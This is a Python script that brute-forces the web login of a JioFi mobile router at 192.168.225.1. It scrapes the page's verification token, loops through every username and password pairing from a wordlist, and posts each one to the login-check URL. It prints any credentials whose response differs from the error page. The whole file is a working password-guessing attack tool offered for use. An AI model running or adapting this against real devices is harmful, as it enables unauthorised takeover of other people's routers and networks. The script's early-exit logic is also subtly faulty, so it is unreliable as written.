import requests
import bs4 as bs 
import time 
import sys
from colorama import Fore

def _getVerifyToken_():
    url = 'http://192.168.225.1'
    response = requests.get(url)
    soup = bs.BeautifulSoup(response.content, 'html.parser')
    TokenHTML = str(soup.find('input', {'id' : 'RequestVerifyToken'}))
    TokenSplit = list(TokenHTML.strip())
    TokenValue = ""
    for i in TokenSplit:
        if i.isdigit() == True:
            TokenValue += i

    return TokenValue 

begin = time.time()

target_url = 'http://192.168.225.1/cgi-bin/en-jio/login_check.html' # jiofi Login Check URL

ask_file = input(" Enter the wordlist file name : ")

credentials_file = open(ask_file, "r")
credentials_list = credentials_file.readlines()
creds_count = len(credentials_list)

# look for the error response , Error response and Success response are different
error_response = requests.get(target_url).content 

with requests.Session() as session:
    while True:
        count = 0
        for username in credentials_list:
            count += 1
            for i in range(0, creds_count):
                payload = {'RequestVerifyToken': _getVerifyToken_(), 'act': username.strip(), 'pwd': credentials_list[i].strip()}
                attack = session.post(target_url, data=payload)
                if attack.content != error_response:
                    print(Fore.GREEN + " Password Found : ")
                    print(" Username = ", username.strip())
                    print(" Password = ", credentials_list[i].strip())
                    print(f" Tested {creds_count} credentials ")
                    end = time.time()
                    print(f" Took : {end - begin} seconds")
                    credentials_file.close()
                    sys.exit(0)
                if count == creds_count:
                    print(" No Credentials Found !!")
                    print(Fore.RED + f" Tested {creds_count} credentials") 
                    print(" Try a different wordlist :) ")
                    end = time.time()
                    print(f" Took : {end - begin} seconds")
                    credentials_file.close()
                    sys.exit(0)
        
credentials_file.close()

